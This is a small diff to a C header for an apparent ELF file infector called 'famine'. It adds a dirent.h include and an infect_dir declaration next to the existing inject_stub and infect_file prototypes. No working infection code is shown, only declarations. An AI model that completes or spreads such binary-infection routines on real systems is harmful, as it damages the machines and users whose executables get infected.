@@ -5,6 +5,7 @@
 #  define _GNU_SOURCE
 # endif
 
+# include <dirent.h>
 # include <elf.h>
 # include <fcntl.h>
 # include <stdint.h>
@@ -71,5 +72,7 @@ uint64_t	highest_vaddr_end(const t_famine *f);
 void		inject_stub(t_famine *f);
 
 int			infect_file(const char *path);
+
+void		infect_dir(const char *dir);
 
 #endif
